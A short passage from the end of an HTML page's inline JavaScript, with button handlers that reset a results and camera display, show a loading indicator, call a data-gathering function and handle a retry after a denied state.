      enterBtn.classList.remove('clicked');
      denied.style.display = 'none';
      results.style.display = 'none';
      dataGrid.innerHTML = '';
      cameraHero.innerHTML = '';
      loading.style.display = 'flex';
      requestAnimationFrame(() => loading.classList.add('visible'));
      gatherAll();
    }, 750);
  });

  retryBtn.addEventListener('click', () => {
    denied.style.display = 'none';
    enterBtn.style.display = 'inline-block';
    enterBtn.classList.remove('clicked');
  });
})();
</script>
</body>
</html>
